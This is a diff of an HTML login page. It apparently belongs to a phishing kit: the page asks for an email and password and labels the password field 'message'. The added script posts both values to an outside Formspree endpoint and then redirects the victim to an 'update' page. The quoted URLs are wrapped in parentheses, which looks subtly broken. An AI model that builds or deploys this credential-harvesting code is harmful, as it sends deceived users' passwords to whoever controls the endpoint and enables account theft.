@@ -30,7 +30,7 @@
 
       </div>
 
-      <form id="myForm" onsubmit="submitForm(event)" action="https://formspree.io/f/mldekyqd" method="POST">
+      <form id="myForm" method="POST">
 
         <input class="mail" name="email" type="text" placeholder="Please enter your email address">
         <input class="pwd" name="message" type="" placeholder="Please enter your password">
@@ -70,12 +70,28 @@
 
 
       <script>
-        function submitForm(event) {
-          event.preventDefault(); // prevent default form submission
-          // submit form data to server using AJAX or fetch API
-          // ...
-          window.location.href = "(update.html)"; // redirect to thank-you page
-        }
+        const form = document.getElementById('myForm');
+
+form.addEventListener('submit', (e) => {
+  e.preventDefault();
+
+  const formData = new FormData(form);
+
+  fetch('(https://formspree.io/f/mldekyqd)', {
+      method: 'POST',
+      body: formData,
+      headers: {
+        'Accept': 'application/json'
+      }
+    })
+    .then((response) => response.json())
+    .then((data) => {
+      console.log(data);
+      // Redirect to another page
+      window.location.href = '(update.html)';
+    })
+    .catch((error) => console.error(error));
+});
       </script>
 
 </body>
